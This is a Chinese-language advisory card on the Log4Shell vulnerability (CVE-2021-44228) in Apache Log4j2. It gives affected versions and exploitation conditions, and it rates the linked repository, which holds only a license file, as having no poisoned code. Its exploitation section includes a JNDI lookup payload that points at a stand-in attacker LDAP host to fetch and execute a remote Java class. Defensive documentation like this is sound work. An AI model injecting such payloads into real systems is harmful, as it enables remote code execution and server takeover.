## CVE-2021-44228 Apache Log4j2 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，并且允许攻击者控制Log4j2的日志消息或日志消息参数

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个严重的远程代码执行漏洞，存在于Apache Log4j2 2.0-beta9到2.15.0版本中（不包括安全版本2.12.2、2.12.3和2.3.1）。

**有效性：**
漏洞库信息明确指出，在特定版本的Log4j2中，JNDI功能未对攻击者控制的LDAP和其他JNDI相关端点提供保护。如果攻击者可以控制日志消息或日志消息参数，并且启用了消息查找替换，则可以执行从LDAP服务器加载的任意代码。因此，可以判定漏洞利用代码有效。

**投毒风险：**
提供的漏洞利用代码只是一个GNU GPL v2许可协议的文本文件，不是漏洞利用的payload或者脚本，不包含任何可执行的代码，因此，不存在投毒代码。投毒风险为0%。

**利用方式：**
该漏洞的利用方式是，攻击者构造包含JNDI查找的恶意字符串，例如`${jndi:ldap://attacker.com/evil}`。当Log4j2记录此字符串时，它会尝试解析JNDI查找。这将导致Log4j2通过LDAP协议连接到攻击者控制的服务器`attacker.com`。攻击者可以在其LDAP服务器上托管一个恶意Java类，当Log4j2连接到LDAP服务器时，该类将被下载并执行，从而导致远程代码执行。需要注意的是，从Log4j 2.15.0开始，此行为已默认禁用，并在版本2.16.0中完全删除（以及2.12.2、2.12.3和2.3.1）。


**项目地址:** [KamalideenAK/Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device](https://github.com/KamalideenAK/Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)